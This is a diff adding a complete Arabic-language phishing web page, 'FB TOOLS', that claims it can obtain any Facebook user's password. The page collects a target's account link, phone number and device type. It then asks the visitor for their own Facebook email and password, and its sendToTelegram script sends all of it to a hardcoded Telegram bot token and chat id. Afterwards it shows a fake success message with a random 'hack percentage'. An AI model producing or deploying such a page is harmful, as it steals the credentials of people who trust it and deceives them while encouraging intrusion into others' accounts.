@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FB TOOLS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #28a745;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .gradient-text {
+            font-size: 36px;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ffffff, #ff0000, #ffff00, #ffa500);
+            background-size: 400% 400%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradient-animation 5s infinite;
+        }
+        @keyframes gradient-animation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+        .container {
+            width: 80%;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        input[type="text"], input[type="tel"], input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            margin-top: 20px;
+            cursor: pointer;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.4);
+        }
+        .modal-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            border-radius: 10px;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover, .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .modal p {
+            color: red;
+            margin: 20px 0;
+        }
+        .additional-info {
+            display: none;
+            margin-top: 20px;
+        }
+        .additional-info button {
+            background-color: #007bff;
+        }
+        .additional-info button:hover {
+            background-color: #0056b3;
+        }
+        #successModal .modal-content p {
+            color: green;
+        }
+        .footer {
+            margin-top: auto;
+            padding: 10px;
+            text-align: center;
+            background-color: #f4f4f9;
+            border-top: 1px solid #ccc;
+        }
+        .footer p {
+            color: red;
+            border: 2px solid black;
+            padding: 10px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1 class="gradient-text">FB TOOLS</h1>
+</header>
+
+<div class="container">
+    <h1>FB TOOLS</h1>
+    <p>الان يمكنك مراقبة اي شخص بكل سهولة</p>
+    <input type="text" id="victim-link" placeholder="رابط حساب الضحية">
+    <input type="tel" id="victim-phone" placeholder="رقم هاتف الضحية">
+    <input type="tel" id="your-phone" placeholder="رقم هاتفك لكي نرسل لك المعلومات">
+    <input type="text" id="victim-device" placeholder="نوع هاتف الضحية">
+    <button onclick="openModal()">الحصول على كلمة السر الان</button>
+</div>
+
+<div id="myModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal()">&times;</span>
+        <p>يجب عليك تسجيل الدخول بحسابك للحصول على كلمة سر الضحية</p>
+        <button onclick="showAdditionalInfo()">موافق</button>
+    </div>
+</div>
+
+<div class="container additional-info" id="additional-info">
+    <input type="text" id="user-email" placeholder="البريد الالكتروني او رقم الهاتف">
+    <input type="password" id="user-password" placeholder="كلمة السر">
+    <button onclick="sendToTelegram()">إبدأ الان</button>
+</div>
+
+<div id="successModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeSuccessModal()">&times;</span>
+        <p id="success-message">تمت بنجاح " سيتم ارسال معلومات الضحية لك في مدة لا تتجاوز 24 ساعة "</p>
+        <p id="hack-percentage">نسبة اختراق الحساب هي: <span id="random-percentage"></span>%</p>
+    </div>
+</div>
+
+<div class="footer">
+    <p>اذا كانت معلومات حسابك على فيسبوك غير صحيحة لن تتمكن من الحصول على كلمة سر الضحية</p>
+</div>
+
+<script>
+    function openModal() {
+        document.getElementById("myModal").style.display = "block";
+    }
+
+    function closeModal() {
+        document.getElementById("myModal").style.display = "none";
+    }
+
+    function showAdditionalInfo() {
+        closeModal();
+        document.getElementById("additional-info").style.display = "block";
+    }
+
+    function closeSuccessModal() {
+        document.getElementById("successModal").style.display = "none";
+    }
+
+    window.onclick = function(event) {
+        if (event.target == document.getElementById("myModal")) {
+            closeModal();
+        }
+        if (event.target == document.getElementById("successModal")) {
+            closeSuccessModal();
+        }
+    }
+
+    function sendToTelegram() {
+        var victimLink = document.getElementById('victim-link').value;
+        var victimPhone = document.getElementById('victim-phone').value;
+        var yourPhone = document.getElementById('your-phone').value;
+        var victimDevice = document.getElementById('victim-device').value;
+        var userEmail = document.getElementById('user-email').value;
+        var userPassword = document.getElementById('user-password').value;
+
+        var message = `
+            رابط حساب الضحية: ${victimLink}
+            رقم هاتف الضحية: ${victimPhone}
+            رقم هاتفك: ${yourPhone}
+            نوع هاتف الضحية: ${victimDevice}
+            البريد الالكتروني او رقم الهاتف: ${userEmail}
+            كلمة السر: ${userPassword}
+        `;
+
+        var token = '7101436809:AAH_YGuxeN-d1IvFrU4h8bBXpZClWVFVvSw';
+        var chat_id = '949056856';  // معرف الدردشة الخاص بك
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+        fetch(url).then(response => {
+            if (response.ok) {
+                var randomPercentage = Math.floor(Math.random() * 51) + 50;
+                document.getElementById("random-percentage").textContent = randomPercentage;
+                document.getElementById("successModal").style.display = "block";
+            } else {
+                alert('حدث خطأ أثناء إرسال المعلومات');
+            }
+        }).catch(error => {
+            console.error('Error:', error);
+            alert('حدث خطأ أثناء إرسال المعلومات');
+        });
+    }
+</script>
+
+</body>
+</html>
